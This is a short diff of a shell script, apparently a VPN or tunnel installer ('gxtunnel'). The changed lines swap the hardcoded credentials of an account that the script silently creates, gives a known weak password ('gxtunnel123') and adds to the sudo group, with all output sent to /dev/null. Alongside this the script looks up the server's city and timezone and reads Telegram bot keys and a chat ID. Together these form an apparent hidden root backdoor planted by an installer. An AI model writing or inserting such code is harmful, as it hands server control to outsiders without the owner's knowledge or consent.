@@ -100,13 +100,13 @@ domain=$(cat /root/domain)
 CITY=$(curl -s ipinfo.io/city )
 WKT=$(curl -s ipinfo.io/timezone )
 userdel jame > /dev/null 2>&1
-Username="najhi"
-Password=najhi
+Username="gxtunnel"
+Password=gxtunnel123
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="6582195916"
+CHATID=""
 CHATIDC=$(cat /etc/gxtunnel/telegram/id)
 KEY=$(cat /etc/gxtunnel/telegram/key)
 TOKEN=""
